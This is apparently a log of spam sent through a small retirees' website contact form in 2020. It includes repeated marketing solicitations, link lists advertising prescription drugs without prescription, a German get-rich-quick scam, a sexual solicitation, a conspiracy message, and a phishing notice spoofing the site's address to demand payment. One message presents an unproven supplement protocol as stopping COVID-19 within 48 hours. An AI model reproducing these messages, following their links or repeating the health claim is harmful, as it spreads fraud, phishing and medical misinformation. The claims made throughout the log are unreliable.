Now it’s also true that when reaching out to hot leads, you MUST act fast – the difference between contacting someone within 5 minutes versus 30 minutes later is huge – like 100 times better!

That’s what makes our new SMS Text With Lead feature so powerful… you’ve got their phone number, so now you can start a text message (SMS) conversation with them… so even if they don’t take you up on your offer right away, you continue to text them new offers, new content, and new reasons to do business with you.

This could change everything for you and your business.

CLICK HERE http://www.talkwithwebvisitors.com to learn more about everything Talk With Web Visitor can do and start turing eyeballs into money.

Eric
PS: Talk With Web Visitor offers a FREE 14 days trial – you could be converting up to 100x more leads immediately!   
It even includes International Long Distance Calling. 
Paying customers are out there waiting. 
Starting connecting today by CLICKING HERE http://www.talkwithwebvisitors.com to try Talk With Web Visitor now.

If you'd like to unsubscribe click here http://talkwithwebvisitors.com/unsubscribe.aspx?d=esyray.com
+++ 2020-08-27 03:02:22 PM -- Email from: Sherri Avery, -- subject: RE: Dropshipping, -- email: ds_i@ftml.net, -- Message is: Hi,

I thought you may be interested.
 
We supply the best niche turnkey dropshipping stores out there.
You keep all of the profit. We are the designers this is all we do.

Free hosting permanantly, domain and social media marketing materials included. 

If this sounds of interest please see our available sites at https://dropshippingincome.com

Thank you for your time and hope to see you there.

Kind regards,
Sherri A.
DSI
+++ 2020-08-28 11:05:40 PM -- Email from: Booskels, -- subject: kjapnphd, -- email: wegerud@gmail.com, -- Message is: &lt;a href=&quot;http://viagrasoftab.com/&quot;&gt;cheap viagra soft&lt;/a&gt; &lt;a href=&quot;http://cymbaltarx.com/&quot;&gt;cymbalta 90 mg capsule&lt;/a&gt; &lt;a href=&quot;http://nolvadex10.com/&quot;&gt;nolvadex 20mg online&lt;/a&gt; &lt;a href=&quot;http://ivaltrex.com/&quot;&gt;how much is valtrex prescription&lt;/a&gt; &lt;a href=&quot;http://backtrim.com/&quot;&gt;bactrim 480&lt;/a&gt; &lt;a href=&quot;http://finpecia911.com/&quot;&gt;finpecia online&lt;/a&gt; &lt;a href=&quot;http://wellbutrin24.com/&quot;&gt;wellbutrin 37.5 mg&lt;/a&gt;
+++ 2020-08-29 06:21:03 AM -- Email from: Kristan Wilfred, -- subject: , -- email: kristan.wilfred@outlook.com, -- Message is: Looking for fresh buyers? Get tons of keyword targeted visitors directly to your site. Boost your profits quick. Start seeing results in as little as 48 hours. For additional information Have a look at: http://www.easy-web-traffic.xyz
+++ 2020-08-29 06:37:24 PM -- Email from: Wimskels, -- subject: axsohnpz, -- email: angelique@gmail.com, -- Message is: &lt;a href=&quot;http://seroquel50.com/&quot;&gt;seroquel liquid form&lt;/a&gt;
+++ 2020-08-30 12:01:50 PM -- Email from: Ugoskels, -- subject: aciprgmw, -- email: skguthrie@outlook.com, -- Message is: &lt;a href=&quot;http://atenolol25.com/&quot;&gt;atenolol pill&lt;/a&gt; &lt;a href=&quot;http://lipitor2020.com/&quot;&gt;lipitor generic australia&lt;/a&gt; &lt;a href=&quot;http://azithromycinp.com/&quot;&gt;azithromycin 500g&lt;/a&gt; &lt;a href=&quot;http://lopressormetoprolol.com/&quot;&gt;rx lopressor&lt;/a&gt; &lt;a href=&quot;http://lisinopril125.com/&quot;&gt;lisinopril online purchase&lt;/a&gt; &lt;a href=&quot;http://colchicine5.com/&quot;&gt;generic colchicine 2015&lt;/a&gt;
+++ 2020-08-31 01:41:14 AM -- Email from: Ashskels, -- subject: uxposvqt, -- email: lucy@outlook.com, -- Message is: &lt;a href=&quot;http://hydroxychloroquinecv.com/&quot;&gt;plaquenil 200 mg 30 film tablet&lt;/a&gt; &lt;a href=&quot;http://lexaporo.com/&quot;&gt;lexapro 40 mg daily&lt;/a&gt; &lt;a href=&quot;http://hydrochlorothiazide2.com/&quot;&gt;hydrochlorothiazide 320&lt;/a&gt; &lt;a href=&quot;http://sildalistab.com/&quot;&gt;sildalis for sale&lt;/a&gt; &lt;a href=&quot;http://triamterenebenzathiazide.com/&quot;&gt;triamterene generic brand name&lt;/a&gt; &lt;a href=&quot;http://fluoxetinetb.com/&quot;&gt;fluoxetine dr&lt;/a&gt;
+++ 2020-08-31 03:18:03 AM -- Email from: Lindsay Harrison, -- subject: Important Reminder, -- email: lindsay@topalexadirectory.top, -- Message is: Hello, we need some additional information regarding your business to be registered on Amazon Alexa and Siri (iPhones) so people can find your company using Voice Search. 

There are more then 31,500 Voice Searches being done every second, wouldn't you agree its time to get your fair share of those searches?

Its simple &amp; easy; Register your business here --&gt; 
http://topalexadirectory.top/abcc1/?=esyray.com


Lindsay
Voice Activation Follow-up Specialist
Top Alexa Directory



 
2764 Pleasant Road Suite Suite A PMB 708
Fort Mill, SC 29708

You can skip future marketing messages here:
https://topalexadirectory.top/out.php?site=esyray.com
+++ 2020-08-31 10:19:50 AM -- Email from: Ashskels, -- subject: errvyqby, -- email: tiffanyshea@mail.com, -- Message is: &lt;a href=&quot;http://gabapentin.us.com/&quot;&gt;gabapentin 50 mg capsules&lt;/a&gt; &lt;a href=&quot;http://sildenafilv.com/&quot;&gt;sildenafil pill cost&lt;/a&gt; &lt;a href=&quot;http://hydrochlorothiazide2.com/&quot;&gt;how much is hydrochlorothiazide 12.5 mg&lt;/a&gt; &lt;a href=&quot;http://robaxin24.com/&quot;&gt;robaxin/methocarbamol 500mg&lt;/a&gt; &lt;a href=&quot;http://clonidinenorx.com/&quot;&gt;cost of clonidine 0.1 mg&lt;/a&gt; &lt;a href=&quot;http://atenolol25.com/&quot;&gt;atenolol otc&lt;/a&gt; &lt;a href=&quot;http://indocinrx.com/&quot;&gt;indocin otc&lt;/a&gt;
+++ 2020-08-31 07:59:09 PM -- Email from: Wimskels, -- subject: akmqzhxn, -- email: jpgaemers@gmail.com, -- Message is: &lt;a href=&quot;http://tadalafilm.com/&quot;&gt;tadalafil buy&lt;/a&gt;
+++ 2020-08-31 09:31:51 PM -- Email from: Jefferey Zajac, -- subject: You Have Been Called Upon, -- email: jefferey.zajac@outlook.com, -- Message is: Hello, I have been informed to contact you. The CIA has been doing intensive research for the past fifty years researching on what we call so called life. That information has been collected and presented for you here https://entropyideas.shortcm.li/GORxRy This has been the finding as of seventeen years ago as of today. Now governments and other large organizations have develop technology around these concepts for their own deceptive uses. Soon you will be contacted by other means for counter measures and the part that you play in all this. Please get this as soon as possible because there are powers that be to take down this information about this.
+++ 2020-09-02 03:36:57 PM -- Email from: Sherri Avery, -- subject: RE: Dropshipping, -- email: dsi1@brusseler.com, -- Message is: Hi,

I thought you may be interested.
 
We supply the best niche turnkey dropshipping stores out there.
You keep all of the profit. We are the designers this is all we do.

Free hosting permanantly, domain and social media marketing materials included. 

If this sounds of interest please see our available sites at https://dropshippingincome.com

Thank you for your time and hope to see you there.

Kind regards,
Sherri A.
DSI
+++ 2020-09-03 09:27:09 AM -- Email from: Ugoskels, -- subject: oakzxapd, -- email: rosemary0201@yahoo.com, -- Message is: &lt;a href=&quot;http://erythromycinlab.com/&quot;&gt;erythromycin brand name in india&lt;/a&gt; &lt;a href=&quot;http://buspar24.com/&quot;&gt;buspar brand name cost&lt;/a&gt; &lt;a href=&quot;http://hydrochlorothiazide2.com/&quot;&gt;hydrochlorothiazide 125mg&lt;/a&gt; &lt;a href=&quot;http://tretinoin365.com/&quot;&gt;tretinoin prescription online&lt;/a&gt;
+++ 2020-09-03 06:23:43 PM -- Email from: Wimskels, -- subject: suqwkosm, -- email: francopietri@hotmail.com, -- Message is: &lt;a href=&quot;http://plavix.us.com/&quot;&gt;plavix uk buy&lt;/a&gt;
+++ 2020-09-04 09:48:09 AM -- Email from: Rachel Florent, -- subject: surprising, -- email: rachel.florent@videomarketingnow.xyz, -- Message is: Hey, 

You have a lot going on right now, but maybe we can help?

We make professional videos for businesses to put on their websites.

See examples of what we can do for you:
https://www.videomarketingnow.xyz/success/?=esyray.com

These videos are helping businesses GROW right now, at a time when they need it most.

Rachel Florent
Custom Video Specialist





410 Santa Clara St. East, Unit 817	
San Jose,	CA 95113
 
No more video marketing:
https://thevideonetwork.top/out.php/?site=esyray.com
+++ 2020-09-05 03:02:29 AM -- Email from: Booskels, -- subject: ltwgqoqy, -- email: markm@yahoo.com, -- Message is: &lt;a href=&quot;http://prozacflx.com/&quot;&gt;prozac 20 mg tablet&lt;/a&gt; &lt;a href=&quot;http://priligydapoxetin.com/&quot;&gt;dapoxetine tablets online&lt;/a&gt;
+++ 2020-09-05 05:12:47 AM -- Email from: Ashskels, -- subject: ercmgatq, -- email: qcash@yahoo.com, -- Message is: &lt;a href=&quot;http://glucophagge.com/&quot;&gt;glucophage cost in india&lt;/a&gt; &lt;a href=&quot;http://malegra.us.org/&quot;&gt;buy malegra 100 online&lt;/a&gt; &lt;a href=&quot;http://prednisolone911.com/&quot;&gt;prednisolone to buy&lt;/a&gt; &lt;a href=&quot;http://dipyridamol.com/&quot;&gt;dipyridamole 50 mg costs&lt;/a&gt; &lt;a href=&quot;http://sumycin365.com/&quot;&gt;sumycin&lt;/a&gt; &lt;a href=&quot;http://ampicillin24.com/&quot;&gt;ampicillin purchase&lt;/a&gt; &lt;a href=&quot;http://cleocing.com/&quot;&gt;cleocin cream cost&lt;/a&gt; &lt;a href=&quot;http://chloroquineav.com/&quot;&gt;chloroquine 900&lt;/a&gt;
+++ 2020-09-06 01:45:31 PM -- Email from: Martin thomas, -- subject: COVID19, -- email: tmartin94157@outlook.com, -- Message is: Dr Deagle https://www.nutrimedical.com/ has protocol that will stop or block the virus within 24-48 hours. My wife was feeling better after 48 hours but really took between 2-3 weeks on this protocol before she was back to normal.
15 drops of Nutridine 3 times a day
2 tablets 4 times a day of Gastroheal
2 pills 3 times a day of Power C Plus
+++ 2020-09-07 11:14:49 AM -- Email from: James Daniels, -- subject: cheap monthly SEO plans, -- email: no-reply@hilkom-digital.de, -- Message is: Hi! 
I have just checked esyray.com for the ranking keywords and seen that your SEO metrics could use a boost. 
 
We will improve your SEO metrics and ranks organically and safely, using only whitehat methods, while providing monthly reports and outstanding support. 
 
Please check our pricelist here, we offer SEO at cheap rates. 
https://www.hilkom-digital.de/cheap-seo-packages/ 
 
Start increasing your sales and leads with us, today! 
 
regards 
Hilkom Digital Team 
support@hilkom-digital.de
+++ 2020-09-07 02:46:42 PM -- Email from: Booskels, -- subject: qzxscpte, -- email: tamela@mail.com, -- Message is: &lt;a href=&quot;http://medrol80.com/&quot;&gt;medrol 500 mg tablet&lt;/a&gt; &lt;a href=&quot;http://tetracyclinecaps.com/&quot;&gt;tetracycline 2016&lt;/a&gt; &lt;a href=&quot;http://zoloft360.com/&quot;&gt;buy zoloft no prescription&lt;/a&gt; &lt;a href=&quot;http://tadalafillil.com/&quot;&gt;tadalafil 6mg&lt;/a&gt; &lt;a href=&quot;http://ivaltrex.com/&quot;&gt;valtrex rx where to buy&lt;/a&gt;
+++ 2020-09-08 10:36:00 AM -- Email from: Wimskels, -- subject: zirpazzy, -- email: civiccameron@outlook.com, -- Message is: &lt;a href=&quot;http://seroquel50.com/&quot;&gt;200mg seroquel&lt;/a&gt;
+++ 2020-09-09 03:42:37 AM -- Email from: Ashskels, -- subject: mdpyhunw, -- email: pauldprismm@outlook.com, -- Message is: &lt;a href=&quot;http://viagragm.com/&quot;&gt;viagra best buy coupon&lt;/a&gt; &lt;a href=&quot;http://tadalafilxr.com/&quot;&gt;cialis 40mg generic&lt;/a&gt; &lt;a href=&quot;http://buyhydroxychloroquine.us.com/&quot;&gt;can you buy plaquenil in mexico&lt;/a&gt; &lt;a href=&quot;http://hydroxyhloroquine.com/&quot;&gt;plaquenil 800 mg&lt;/a&gt; &lt;a href=&quot;http://seroqueltb.com/&quot;&gt;seroquel xr price&lt;/a&gt;
+++ 2020-09-10 12:47:07 AM -- Email from: DelorisPat, -- subject: Choose The Online Publishers for All Your Digital Marketing Needs, -- email: contact1@theonlinepublishers.com, -- Message is: Hello, we are The Online Publishers (TOP) and want to introduce ourselves to you.  TOP is an established comprehensive global online hub.  We connect clients to expert freelancers in all facets of the world of digital marketing such as writers, journalists, bloggers, authors, advertisers, publishers, social media influencers, backlinks managers, Vloggers/video marketers and reviewers… A few of the many services we offer are content creation and placement, publishing, advertising, online translation, and social media management.  We also have two full online libraries, one of photographs and the other of eBooks and informative resources. 
Save money and time by using TOP services.  Rather than having to search for multiple providers of various tasks, we are a one-stop-shop.  We have all the services you will ever need right here.  For a complete list, check out our website https://www.theonlinepublishers.com 
TOP can help any business surge ahead of its competition and increase sales.  Join The Online Publishers today.
+++ 2020-09-11 12:58:55 PM -- Email from: Daniel, -- subject: Plan out your social media posts like a pro with this free calendar, -- email: contact@blincagency.com, -- Message is: Hi there, 
Do you want to use social media to grow your business, but don’t know what to post on your social media every day? Our social media content calendar will get you there. It tells you exactly what to post every single day of the month. Absolutely free and no strings attached. 
 
Download PDF calendar here: https://bit.ly/32hDZnN 
 
Thanks, 
Daniel Todercan 
Owner 
New Light Digital
+++ 2020-09-12 03:14:21 AM -- Email from: Wimskels, -- subject: qwvgqcua, -- email: tpolass@mail.com, -- Message is: &lt;a href=&quot;http://chloroquime.com/&quot;&gt;aralen cvs&lt;/a&gt;
+++ 2020-09-12 04:54:48 AM -- Email from: Booskels, -- subject: rspdehwq, -- email: bk291@gmail.com, -- Message is: &lt;a href=&quot;http://vardemafil.com/&quot;&gt;cheap generic levitra india&lt;/a&gt; &lt;a href=&quot;http://tadacipmed.com/&quot;&gt;tadacip 10 mg&lt;/a&gt; &lt;a href=&quot;http://ivermectincv.com/&quot;&gt;stromectol tablets uk&lt;/a&gt;
+++ 2020-09-12 07:56:38 AM -- Email from: Nicole Rideout, -- subject: Important Reminder, -- email: nicole@alexadirectory.top, -- Message is: Hey! 

Have you remembered to activate voice search for your business?

Activate it here in 30 seconds:

https://alexadirectory.top/abcc1/?=esyray.com

Without activation, customers may not be able to find esyray.com with voice searches on Google, Amazon Alexa or mobile phones.

Nicole Ritter
Voice Activation Follow-up Specialist














 
2764 Pleasant Road Suite Suite A PMB 708
Fort Mill, SC 29708

You can skip future marketing messages here:
https://alexadirectory.top/out.php?site=esyray.com
+++ 2020-09-13 08:13:16 AM -- Email from: Ugoskels, -- subject: phzvllev, -- email: majorie@yahoo.com, -- Message is: &lt;a href=&quot;http://aralen.us.org/&quot;&gt;chloroquine ph&lt;/a&gt; &lt;a href=&quot;http://ciprotab.com/&quot;&gt;buy ciprofloraxin online&lt;/a&gt;
+++ 2020-09-13 09:45:02 AM -- Email from: Ashskels, -- subject: xlxnszmr, -- email: pv@outlook.com, -- Message is: &lt;a href=&quot;http://paxil1000.com/&quot;&gt;paroxetine order online india&lt;/a&gt; &lt;a href=&quot;http://anafraniltab.com/&quot;&gt;anafranil for sale&lt;/a&gt; &lt;a href=&quot;http://chloroquime.com/&quot;&gt;chloroquine cost uk&lt;/a&gt; &lt;a href=&quot;http://medrall.com/&quot;&gt;medrol 2mg tablet&lt;/a&gt; &lt;a href=&quot;http://bactrimonline.com/&quot;&gt;bactrim 875 mg&lt;/a&gt; &lt;a href=&quot;http://prazosin24.com/&quot;&gt;prazosin 100mg&lt;/a&gt; &lt;a href=&quot;http://tadacipmed.com/&quot;&gt;tadacip 5&lt;/a&gt;
+++ 2020-09-13 10:34:28 PM -- Email from: Wimskels, -- subject: bxwodagn, -- email: jacksonjohn118@hotmail.com, -- Message is: &lt;a href=&quot;http://hydroxychloroquinerem.com/&quot;&gt;hydroxy-chloroquine&lt;/a&gt;
+++ 2020-09-14 12:02:26 PM -- Email from: Hattie Tanner, -- subject: Uncertain times, -- email: hattie.tanner@supervideomarketing.top, -- Message is: Hi – I hope you and your family are doing well!

Could your business benefit from a custom-made video right now?

Here's how we can help:
https://www.supervideomarketing.top/success/?=esyray.com


It's a very effective way to convert new customers, especially during these uncertain times!

Be well,
Hattie








- This commercial message sent from PJLK Marketing LC
410 E Santa Clara St. RBLD#817
San Jose, CA 95113

To unsubscribe click here:
https://supervideomarketing.top/out.php/?site=esyray.com
+++ 2020-09-14 06:59:22 PM -- Email from: Diane Elder, -- subject: elder.diane@msn.com, -- email: elder.diane@msn.com, -- Message is: Would you like to post your business on tons of online ad sites every month? For a small monthly payment you can get virtually unlimited traffic to your site forever!

For all the details, check out: http://bit.ly/endless-traffic-forever
+++ 2020-09-15 06:30:29 AM -- Email from: Zachery Eleanor, -- subject: , -- email: eleanor.zachery@gmail.com, -- Message is: Good evening, I was just visiting your website and submitted this message via your feedback form. The feedback page on your site sends you these messages to your email account which is the reason you are reading my message at this moment right? This is the most important achievement with any kind of online ad, getting people to actually READ your ad and this is exactly what you're doing now! If you have an ad message you would like to blast out to thousands of websites via their contact forms in the U.S. or to any country worldwide send me a quick note now, I can even focus on particular niches and my costs are very reasonable. Write an email to: kinleytrey96@gmail.com

stop spamming my website contact form https://bit.ly/2VBnm2R
+++ 2020-09-15 07:33:28 PM -- Email from: Arthurhar, -- subject: Nvdfjhdficj efiuwdiwrhfduehfjei kfksdjaksdhsjfhwkjf https://mail.ru/?ddjfsjfuwfw, -- email: kurbatakifev1987957akp@inbox.ru, -- Message is: Nvdfjhdficj efiuwdiwrhfduehfjei kfksdjaksdhsjfhwkjf https://mail.ru/?ddjfsjfuwfw
+++ 2020-09-17 02:28:13 AM -- Email from: Ashskels, -- subject: vmpruzvp, -- email: joshscribner17@hotmail.com, -- Message is: &lt;a href=&quot;http://advairsale.com/&quot;&gt;advair 500 50 mg&lt;/a&gt; &lt;a href=&quot;http://viagrasl.com/&quot;&gt;viagra from canada prices&lt;/a&gt; &lt;a href=&quot;http://citalopramb.com/&quot;&gt;cheap citalopram&lt;/a&gt; &lt;a href=&quot;http://hydroxychloroquine5.com/&quot;&gt;hydroxychloroquine-o-sulfate&lt;/a&gt; &lt;a href=&quot;http://wellbutrin15.com/&quot;&gt;bupropion otc&lt;/a&gt; &lt;a href=&quot;http://sildenafil9.com/&quot;&gt;sildenafil generic 5mg&lt;/a&gt;
+++ 2020-09-17 11:29:35 AM -- Email from: Francis Jamieson, -- subject: Voice search, -- email: francis.jamieson@newalexabusinessdirectory.top, -- Message is: Hello, we need some additional information regarding your business to be registered on Amazon Alexa and Siri (iPhones) so people can find your company using Voice Search. 

There are more then 31,500 Voice Searches being done every second, wouldn't you agree its time to get your fair share of those searches?

Its simple &amp; easy; Register your business here --&gt; 
https://newalexabusinessdirectory.top/abcc1/?=esyray.com


 

 
Francis















 
1 7 1 Passaic str eet, Garf eld NJ 0 7 0 2 6

You can skip future marketing messages here:
https://newalexabusinessdirectory.top/out.php?site=esyray.com
+++ 2020-09-17 12:12:00 PM -- Email from: Victorgenna, -- subject: PASSIVES EINKOMMEN ONLINE VOR 5976 EURO AM TAG - DER BESTE WEG, UM ONLINE GELD ZU VERDIENEN, -- email: ralph.spilles@yahoo.de, -- Message is: ICH HABЕ GЕRADЕ UM ЕINE WЕITERЕ AUSZAHLUNG VON 7.415 EUR GEBЕTEN. 
https://758965euro.page.link/hDXg 
IСH KANN ES KАUM ЕRWARTЕN, ЕS MIT MEINЕR FREUNDIN ZU VЕRBRINGЕN. 
NЕHME ICH SIE ZUM ABENDESSEN MIT? 
ODЕR NЕHMEN WIR UNS EINEN TAG FRЕI UND GЕHЕN IN ЕIN SCHONЕS HОTЕL AUF DЕM LAND? 
https://758965euro.page.link/Xd9w 
ICH HATTЕ NIE GEDАСHT, DАSS ICH SO EIN DILEMMA HABЕN WURDE https://8569euro.page.link/D6Cx АBER ES MАСHT MIR NICHTS АUS!
+++ 2020-09-17 06:48:11 PM -- Email from: Booskels, -- subject: nahyetoa, -- email: minews27@gmail.com, -- Message is: &lt;a href=&quot;http://vardemafil.com/&quot;&gt;how much is vardenafil&lt;/a&gt; &lt;a href=&quot;http://hydroxychloroquine2.com/&quot;&gt;hydroxychloroquine virus&lt;/a&gt; &lt;a href=&quot;http://viagradm.com/&quot;&gt;cost of prescription viagra&lt;/a&gt; &lt;a href=&quot;http://hydroxychloroquineusa.com/&quot;&gt;hydroxychloroquine 10 price&lt;/a&gt; &lt;a href=&quot;http://tadalafil.us.org/&quot;&gt;tadalafil 75 mg&lt;/a&gt; &lt;a href=&quot;http://tetracycline5.com/&quot;&gt;terramycin 250 capsule&lt;/a&gt;
+++ 2020-09-18 09:54:57 AM -- Email from: Ugoskels, -- subject: lxrslnlg, -- email: lkay13@yahoo.com, -- Message is: &lt;a href=&quot;http://finpeciax.com/&quot;&gt;finasteride 1mg coupon&lt;/a&gt; &lt;a href=&quot;http://dapoxetine360.com/&quot;&gt;dapoxetine 60mg buy&lt;/a&gt; &lt;a href=&quot;http://sildenafil240.com/&quot;&gt;buy sildenafil uk&lt;/a&gt; &lt;a href=&quot;http://cephalexinlab.com/&quot;&gt;cephalexin 800 mg&lt;/a&gt; &lt;a href=&quot;http://biaxin24.com/&quot;&gt;biaxin&lt;/a&gt; &lt;a href=&quot;http://tetracycline5.com/&quot;&gt;tetracycline brand name canada&lt;/a&gt; &lt;a href=&quot;http://sildenafilt.com/&quot;&gt;how to order sildenafil online&lt;/a&gt; &lt;a href=&quot;http://prazosin24.com/&quot;&gt;prazosin for anxiety&lt;/a&gt;
+++ 2020-09-19 08:07:44 AM -- Email from: Pamelaunsap, -- subject: Grow Your Business with TOP Vlogger Experts, -- email: contact2@theonlinepublishers.com, -- Message is: Grow Your Business with TOP Vlogger Experts 
 
How would you like to have your company's story told in video clips?  What better way to do that than with a series of short videos?  Welcome to the world of vlogging.  Vlogging is essentially blogging, except it is in the form of videos instead of written text.  When you are a client of The Online Publishers (TOP) we can connect you with professionals who excel at this unique type of marketing.  TOP Combines Vlogging and Influencers Marketing to boost your online reputation. 
 
Clients love being able to express the highlights of their company or region through videos.  A great digital marketing firm not only knows the ins and outs of creating vlogs but knows how and where to place them to gain the maximum exposure.  Allow the vlogging gurus at TOP to do these things for you. 
 
Another key feature of vlogging that TOP is excellent at is using social media sites to boost the videos.  All exposure that your videos can obtain through social sites is great.  Our service providers can successfully accomplish this for you.  This is especially fantastic if you need to bolster your online reputation.  Vlogs are a perfect way to do that and our providers know how to get it done right.  Go online to http://www.theonlinepublishers.com/ now and ask our support team all about it.
+++ 2020-09-19 11:27:43 AM -- Email from: Неllо hоt guy! I wish you to fuск me in аll hоles: http://freeurlredirect.com/3d7v3, -- subject: Нi hоt guy! Nоw I'm in yоur city and I want tо hаvе fun, I lovе sеx vеrу much: https://links.wtf/PZwW, -- email: a1solarpower@yahoo.com, -- Message is: Heу mаcho! I reallу wаnt уоu to fuсk me in аll holеs: http://asq.kr/cK9F9wAY7lRT
+++ 2020-09-20 11:08:32 PM -- Email from: Ashskels, -- subject: dfqakpyg, -- email: tenorholic@yahoo.com, -- Message is: &lt;a href=&quot;http://tadacipmed.com/&quot;&gt;canadian tadacip&lt;/a&gt; &lt;a href=&quot;http://hydroxychloroquine5.com/&quot;&gt;quineprox 200 mg&lt;/a&gt; &lt;a href=&quot;http://chloroquinev.com/&quot;&gt;buy chloroquine phosphate tablets&lt;/a&gt; &lt;a href=&quot;http://buyviagaonline.com/&quot;&gt;viagra 150 tablet&lt;/a&gt; &lt;a href=&quot;http://hydroxychloroquine360.com/&quot;&gt;plaquenil brand&lt;/a&gt;
+++ 2020-09-21 05:29:40 AM -- Email from: Lindsay Harrison, -- subject: Important Reminder, -- email: lindsay@topalexadirectory.top, -- Message is: Hello, we need some additional information regarding your business to be registered on Amazon Alexa and Siri (iPhones) so people can find your company using Voice Search. 

There are more then 31,500 Voice Searches being done every second, wouldn't you agree its time to get your fair share of those searches?

Its simple &amp; easy; Register your business here --&gt; 
http://topalexadirectory.top/abcc1/?=esyray.com


Lindsay
Voice Activation Follow-up Specialist
Top Alexa Directory



 
2764 Pleasant Road Suite Suite A PMB 708
Fort Mill, SC 29708

You can skip future marketing messages here:
https://topalexadirectory.top/out.php?site=esyray.com
+++ 2020-09-21 11:41:15 AM -- Email from: Mike Quincy, -- subject: New: DA50 for esyray.com, -- email: no-replytam@google.com, -- Message is: Hi there 
If you want to get ahead of your competition, have a higher Domain Authority score. Its just simple as that. 
With our service you get Domain Authority above 50 points in just 30 days. 
 
This service is guaranteed 
 
For more information, check our service here 
https://www.monkeydigital.co/Get-Guaranteed-Domain-Authority-50/ 
 
thank you 
Mike Quincy
 
Monkey Digital 
support@monkeydigital.co
+++ 2020-09-21 12:41:53 PM -- Email from: Wimskels, -- subject: mmablhtq, -- email: jordon9442@hotmail.com, -- Message is: &lt;a href=&quot;http://viagrazbs.com/&quot;&gt;purchase viagra tablets&lt;/a&gt;
+++ 2020-09-21 02:56:30 PM -- Email from: Hattie Tanner, -- subject: Uncertain times, -- email: hattie.tanner@supervideomarketing.top, -- Message is: Hi – I hope you and your family are doing well!

Could your business benefit from a custom-made video right now?

Here's how we can help:
https://www.supervideomarketing.top/success/?=esyray.com


It's a very effective way to convert new customers, especially during these uncertain times!

Be well,
Hattie








- This commercial message sent from PJLK Marketing LC
410 E Santa Clara St. RBLD#817
San Jose, CA 95113

To unsubscribe click here:
https://supervideomarketing.top/out.php/?site=esyray.com
+++ 2020-09-23 07:16:59 AM -- Email from: Wimskels, -- subject: rmrylsvi, -- email: verona@mail.com, -- Message is: &lt;a href=&quot;http://sildenafil9.com/&quot;&gt;how to purchase viagra&lt;/a&gt;
+++ 2020-09-23 09:12:49 PM -- Email from: Casimira Kyte, -- subject: , -- email: kyte.casimira@yahoo.com, -- Message is: Want completely free advertising for your website? Take a look at this: http://bit.ly/post-free-ads-here
+++ 2020-09-23 09:21:15 PM -- Email from: Eric Jones, -- subject: Turn Surf-Surf-Surf into Talk Talk Talk, -- email: eric@talkwithwebvisitor.com, -- Message is: Hello, my name’s Eric and I just ran across your website at esyray.com...

I found it after a quick search, so your SEO’s working out…

Content looks pretty good…

One thing’s missing though…

A QUICK, EASY way to connect with you NOW.

Because studies show that a web lead like me will only hang out a few seconds – 7 out of 10 disappear almost instantly, Surf Surf Surf… then gone forever.

I have the solution:

Talk With Web Visitor is a software widget that’s works on your site, ready to capture any visitor’s Name, Email address and Phone Number.  You’ll know immediately they’re interested and you can call them directly to TALK with them - literally while they’re still on the web looking at your site.

CLICK HERE http://www.talkwithwebvisitors.com to try out a Live Demo with Talk With Web Visitor now to see exactly how it works and even give it a try… it could be huge for your business.

Plus, now that you’ve got that phone number, with our new SMS Text With Lead feature, you can automatically start a text (SMS) conversation pronto… which is so powerful, because connecting with someone within the first 5 minutes is 100 times more effective than waiting 30 minutes or more later.

The new text messaging feature lets you follow up regularly with new offers, content links, even just follow up notes to build a relationship.

Everything I’ve just described is extremely simple to implement, cost-effective, and profitable.
 
CLICK HERE http://www.talkwithwebvisitors.com to discover what Talk With Web Visitor can do for your business, potentially converting up to 100X more eyeballs into leads today!

Eric
PS: Talk With Web Visitor offers a FREE 14 days trial – and it even includes International Long Distance Calling. 
You have customers waiting to talk with you right now… don’t keep them waiting. 
CLICK HERE http://www.talkwithwebvisitors.com to try Talk With Web Visitor now.

If you'd like to unsubscribe click here http://talkwithwebvisitors.com/unsubscribe.aspx?d=esyray.com
+++ 2020-09-24 12:20:35 AM -- Email from: Booskels, -- subject: mcczitsf, -- email: geoffreyhenning@mail.com, -- Message is: &lt;a href=&quot;http://strattera2.com/&quot;&gt;strattera prescription&lt;/a&gt; &lt;a href=&quot;http://propranololtab.com/&quot;&gt;inderal for sale&lt;/a&gt; &lt;a href=&quot;http://aralen.us.org/&quot;&gt;chloroquine generic&lt;/a&gt; &lt;a href=&quot;http://viagraphrm.com/&quot;&gt;how to buy viagra without prescription&lt;/a&gt; &lt;a href=&quot;http://citalopramb.com/&quot;&gt;citalopram coupon&lt;/a&gt; &lt;a href=&quot;http://sildenafil240.com/&quot;&gt;sildenafil 100mg price&lt;/a&gt; &lt;a href=&quot;http://bactrimonline.com/&quot;&gt;antibiotic bactrim&lt;/a&gt; &lt;a href=&quot;http://flagyl911.com/&quot;&gt;flagyl tablets 200mg&lt;/a&gt;
+++ 2020-09-24 11:21:42 PM -- Email from: Max Simcox, -- subject: esyray.com NOTICE., -- email: information@esyray.com, -- Message is: ATT: esyray.com / E-Systems/Raytheon Garland Retirees  WEB SITE SOLUTIONS
This notice EXPIRES ON: Sep 24, 2020


We have actually not received a settlement from you.
We've attempted to contact you yet were not able to contact you.


Kindly Browse Through: https://bit.ly/3048Wuh .

For information and to process a optional payment for services.



09242020192116.
+++ 2020-09-25 01:34:14 AM -- Email from: Ugoskels, -- subject: zqkgvior, -- email: cameliabucur@outlook.com, -- Message is: &lt;a href=&quot;http://vermoxmebendazole.com/&quot;&gt;vermox 500mg for sale&lt;/a&gt; &lt;a href=&quot;http://prazosin24.com/&quot;&gt;prazosin cats&lt;/a&gt; &lt;a href=&quot;http://finpeciax.com/&quot;&gt;finasteride tablets&lt;/a&gt; &lt;a href=&quot;http://elimitep.com/&quot;&gt;cheap elimite&lt;/a&gt; &lt;a href=&quot;http://hydroxychloroquineusa.com/&quot;&gt;hydroxychloroquine 0.5 mg&lt;/a&gt; &lt;a href=&quot;http://cipro2.com/&quot;&gt;order ciprofloxacin online uk&lt;/a&gt; &lt;a href=&quot;http://flomax365.com/&quot;&gt;flomax for sale&lt;/a&gt;
+++ 2020-09-25 05:58:26 AM -- Email from: Ashskels, -- subject: uvcnwkig, -- email: lynappe@hotmail.com, -- Message is: &lt;a href=&quot;http://tadalafilhit.com/&quot;&gt;tadalafil 10mg prices uk&lt;/a&gt; &lt;a href=&quot;http://baclofen365.com/&quot;&gt;baclofen no preciption&lt;/a&gt; &lt;a href=&quot;http://albenzarx.com/&quot;&gt;where to get albendazole&lt;/a&gt; &lt;a href=&quot;http://amoxill.com/&quot;&gt;amoxicillin for sale&lt;/a&gt; &lt;a href=&quot;http://viagraphrm.com/&quot;&gt;sildenafil 100mg online india&lt;/a&gt; &lt;a href=&quot;http://smotrin.com/&quot;&gt;cost comparison motrin 800 mg&lt;/a&gt;
